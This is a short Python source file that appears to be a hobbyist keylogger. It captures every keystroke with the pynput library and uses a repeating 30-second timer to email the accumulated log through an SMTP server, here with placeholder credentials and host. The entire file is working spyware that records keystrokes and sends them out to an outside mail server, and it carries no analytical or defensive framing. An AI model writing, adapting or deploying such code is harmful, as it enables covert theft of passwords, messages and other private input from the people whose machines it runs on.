from pynput import keyboard
import smtplib
import threading
try:
    log = ""

    def keyboard_press(key):
        global log
        try:
            log += str(key.char)
        except AttributeError:
            if key == key.space:
                log += " "
            else:
                log += str(key)
        print(log)

    def send_mail(email, password, log, server, port):
        email_server = smtplib.SMTP(server, port)
        email_server.starttls()
        email_server.login(email, password)
        email_server.sendmail(email, email, log)
        email_server.quit()

        
    keylogger_listener = keyboard.Listener(on_press=keyboard_press)

    def thread_function():
        global log
        send_mail("test@gmail.com","1234",log.encode("utf-8"),"smtp.server.com",1234)
        log = ""
        timer_object = threading.Timer(30,thread_function)
        timer_object.start()

    with keylogger_listener:
        thread_function()
        keylogger_listener.join()

        
except (KeyboardInterrupt):
    print("Keylogger exited")
